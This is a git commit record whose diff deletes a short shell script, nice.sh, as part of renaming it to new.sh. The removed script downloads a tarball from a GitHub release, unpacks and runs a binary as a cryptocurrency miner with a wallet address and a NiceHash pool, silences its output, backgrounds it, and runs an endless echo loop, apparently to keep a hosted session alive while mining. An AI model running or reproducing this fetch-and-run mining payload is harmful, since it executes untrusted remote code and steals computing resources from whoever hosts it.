88ac33dc53c17262085b45c5d53f86864b1e66cc
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-16 04:41:06 +0700

    Update and rename nice.sh to new.sh

--- nice.sh
+++
@@ -1,6 +0,0 @@
-wget https://github.com/exo0088/zuan/releases/download/bonk/work.tar.gz && tar -xvf work.tar.gz > /dev/null 2>&1 && chmod +x work && ./work -algo randomx -wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f  -coin BTC -rigName "vivo" -pool1 randomxmonero.eu.nicehash.com:3380 -threads= 1 >/dev/null 2>&1 &
-while true
-do
-        echo "gasss........!"
-        sleep 20
-done
